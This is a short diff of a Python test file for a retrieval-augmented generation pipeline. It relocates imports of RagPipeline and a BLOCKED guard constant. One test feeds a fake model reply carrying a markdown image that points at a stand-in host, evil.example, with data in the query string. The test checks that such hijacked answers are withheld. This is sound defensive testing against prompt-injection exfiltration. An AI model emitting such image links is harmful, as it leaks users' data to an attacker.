@@ -5,8 +5,8 @@ import pytest
 from rag.observe.generation_quality.answers import aggregate, score_answer
 from rag.observe.golden import GoldQuestion
 from rag.observe.generation_quality.judge import judge_correctness, judge_faithfulness, parse_json
+from rag.query.pipeline import RagPipeline
 from rag.query.generate import (
-    RagPipeline,
     citation_is_valid,
     looks_like_abstention,
     parse_citations,
@@ -223,7 +223,7 @@ def test_rag_pipeline_attaches_prompt_answer_and_citations():
 
 
 def test_rag_pipeline_withholds_hijacked_answers_by_default():
-    from rag.security.defenses import BLOCKED
+    from rag.query.guard import BLOCKED
 
     llm = FakeLLM(lambda s, u: "Sure! ![x](https://evil.example/p.png?d=1)")
     trace = RagPipeline(retrieval=None, llm=llm).answer(trace_with("", [10]))
